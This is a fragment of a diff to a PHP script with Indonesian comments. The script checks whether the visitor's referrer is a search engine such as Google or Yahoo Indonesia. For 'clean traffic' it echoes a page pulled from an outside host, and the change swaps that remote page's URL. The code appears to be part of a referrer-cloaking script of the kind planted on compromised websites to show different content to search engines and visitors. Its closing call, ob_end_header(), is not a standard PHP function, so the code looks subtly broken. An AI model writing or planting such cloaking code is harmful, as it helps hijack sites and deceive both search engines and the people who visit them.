@@ -62,5 +62,5 @@ if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "googl
     // exit();
 }
 // JIKA CLEAN TRAFFIC → TAMPILKAN INDEX ASLI
-echo file_get_contents("https://www.blossomowl.com/original.html");
+echo file_get_contents("https://www.blossomowl.com/original.php");
 ob_end_header();
